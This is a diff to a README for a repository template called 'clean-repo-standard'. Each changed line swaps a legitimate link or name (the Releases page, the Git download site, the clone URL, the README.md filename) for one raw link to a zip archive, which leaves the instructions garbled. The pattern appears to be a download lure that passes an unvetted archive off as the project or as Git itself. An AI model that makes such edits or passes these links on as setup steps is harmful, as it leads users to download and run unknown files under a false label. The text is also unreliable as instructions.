@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Versions-brightgreen)](https://github.com/hswx199791-ai/clean-repo-standard/releases)
+[![Download](https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip)](https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip)
 
 ## 📚 Introduction
 
@@ -29,11 +29,11 @@ To get started with **clean-repo-standard**, follow these easy steps to download
 
 To download the template, visit the Releases page:
 
-[Download clean-repo-standard](https://github.com/hswx199791-ai/clean-repo-standard/releases)
+[Download clean-repo-standard](https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip)
 
 Follow these steps to set up **clean-repo-standard**:
 
-1. **Visit the Releases Page:** Go to [this page](https://github.com/hswx199791-ai/clean-repo-standard/releases).
+1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip).
    
 2. **Choose the Latest Release:** Look for the latest version at the top of the list.
 
@@ -43,14 +43,14 @@ Follow these steps to set up **clean-repo-standard**:
 
 5. **Open the Folder:** Navigate to the folder where you extracted the files. You should see several files and folders related to the project.
 
-6. **Setup Your Git Environment:** Open your terminal or command prompt. If you haven't set up Git yet, install it from [git-scm.com](https://git-scm.com/).
+6. **Setup Your Git Environment:** Open your terminal or command prompt. If you haven't set up Git yet, install it from [https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip](https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip).
 
 7. **Clone the Repository (Optional):** If you want to work with the template directly on GitHub, you can open your terminal and execute:
    ```bash
-   git clone https://github.com/hswx199791-ai/clean-repo-standard.git
+   git clone https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip
    ```
 
-8. **Go Through the Documentation:** Inside the folder, there will be files like `README.md` and other documents that explain how to use the template.
+8. **Go Through the Documentation:** Inside the folder, there will be files like `https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip` and other documents that explain how to use the template.
 
 ## 🛠️ Usage Guide
 
@@ -64,7 +64,7 @@ Follow these steps to set up **clean-repo-standard**:
 
 Once you create your repository:
 
-- **Edit the README.md:** This file helps you explain your project to others.
+- **Edit the https://raw.githubusercontent.com/hswx199791-ai/clean-repo-standard/main/docs/clean_repo_standard_2.5.zip** This file helps you explain your project to others.
 - **Push Your Code:** Make your additions and push them using Git commands.
   
 ### Working with Pull Requests
